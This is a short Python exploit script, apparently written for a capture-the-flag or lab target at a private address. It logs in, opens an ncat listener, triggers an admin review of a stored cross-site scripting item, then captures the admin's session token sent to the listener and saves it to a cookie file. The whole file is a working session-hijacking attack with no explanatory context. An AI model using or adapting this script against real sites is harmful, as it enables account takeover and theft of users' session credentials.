import requests as rq
import subprocess as sp

url = 'http://10.10.55.51'
user = 'test'
pswd = 'test'
xss_item = 3

s = rq.Session()

def login(s, user, pswd):
	data = {'username': user, 'password': pswd}
	res = s.post(url+'/login', data=data)
	print(res.text)

def listen(port):
	p = sp.Popen(['ncat', '-lvnp', str(port)], stdout=sp.PIPE, encoding='ascii')
	return p

def report(s, xss_item):
	s.post(url+f'/report/{xss_item}')

login(s, user, pswd)
p = listen(9000)
report(s, xss_item)
try:
	p.wait(timeout=5)
except:
	pass
p.kill()
out, err = p.communicate()
token = out[out.find('token='):out.find(' HTTP')]
print(f'Admin cookie: {token}')

with open('admin.cookie', 'w') as f:
	f.write(f'Set-Cookie: {token};')
	
